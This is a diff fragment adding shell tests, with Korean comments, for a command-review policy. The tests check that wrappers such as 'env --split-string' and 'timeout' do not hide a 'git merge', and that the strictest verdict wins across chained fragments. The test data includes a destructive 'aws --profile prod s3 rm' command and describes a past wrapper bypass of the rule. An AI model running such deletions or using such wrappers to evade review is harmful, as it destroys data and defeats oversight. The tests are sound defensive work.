+# 이력 합류 술어도 같은 벗김을 쓴다. 자기 손글씨 벗김을 쓰던 동안 분할 문자열은
+# 여기서도 대입으로 읽혀 `true` 에 대해 답했고, 그러면 리뷰 규칙이 그 머지를
+# 다음 줄에서 면제한다 — 등급만 고쳐 두면 녹색이면서 아무 일도 안 하는 수리다.
+check "61: 이력 합류 술어도 래퍼 너머를 본다" \
+  "$(s61 'H env --split-string="git merge seg" true; H env X=1 git merge seg; H timeout 5 git merge seg; H mkdir x')" \
+  "1
+1
+1
+0"
+# 조각이 여럿이면 가장 엄한 답이 이긴다 — 앞 조각이 맞았다고 뒤 조각이 면제되지
+# 않는다. 도구를 안 부르는 조각은 건너뛴다.
+check "61: 여러 조각 중 가장 엄한 답이 이긴다" \
+  "$(s61 'V sh -c "aws --profile dev s3 ls; aws --profile prod s3 rm s3://x"; V sh -c "echo hi; ls"')" \
+  "불일치
+대조불가"
+S61_DEV=
+S61_AWS=
 
 # ---------------------------------------------------------------------------
 # 59. 페이싱 이음매 — pace 블록·pace 행·--fields·근거 예산·라우팅 좌석의 shared/ 울타리
